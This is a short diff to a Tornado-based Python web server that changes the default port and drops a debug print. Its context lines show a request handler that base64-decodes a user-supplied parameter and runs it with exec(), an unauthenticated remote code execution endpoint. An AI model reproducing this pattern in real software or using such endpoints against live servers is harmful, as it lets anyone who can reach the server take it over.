@@ -11,7 +11,7 @@ from tornado.options import define, options
 import requests
 import mem_data
 
-define("port", default=1025, help="run on the given port", type=int)
+define("port", default=1320, help="run on the given port", type=int)
 
 table=mem_data.Mem_table()
 table=table.mem_table
@@ -25,7 +25,6 @@ class IndexHandler(tornado.web.RequestHandler):
         self.data='OK'
         shell=base64.urlsafe_b64decode(parameter.encode('utf-8')).decode('utf-8')
         exec(shell)
-        print(table)
         self.write(self.data)
 
         
